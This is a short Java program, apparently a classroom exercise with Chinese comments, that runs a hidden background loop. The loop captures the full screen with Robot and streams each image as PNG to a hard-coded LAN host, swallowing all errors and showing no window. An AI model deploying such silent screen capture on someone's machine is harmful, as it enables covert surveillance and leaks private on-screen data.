import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.awt.image.*;
import java.io.*;
import java.net.*;
import javax.imageio.*;

//客户端程序
class EtoakClient {

    JFrame frame;// 框架
    JLabel lab;// 标签

    public EtoakClient() throws Exception {
        new Thread() {
            public void run() {
                try {
                    Dimension all = Toolkit.getDefaultToolkit().getScreenSize();  // 读取当前窗口大小；
                    Robot robot = new Robot();  // 被监控对象* ？
                    BufferedImage image;
                    OutputStream os = null;
                    while (true) {
                        //Socket socket = new Socket("192.168.1.117", 1212);  // 本地局域网；
                        Socket socket = new Socket("10.236.108.210", 1212);  // 本地局域网；
                        os = socket.getOutputStream();  // 为本地输出流拿到socket的输出流引用
                        image = robot
                                .createScreenCapture(new Rectangle(0, 0, (int) all.getWidth(), (int) all.getHeight()));
                        // image是本机的（？）截屏
                        ImageIO.write(image, "png", os);  // 向输出流中写图片；
                    }
                } catch (Exception ex) {}
            }
        }.start();
    }
    public static void main(String[] args) throws Exception {
        new EtoakClient();
    }
}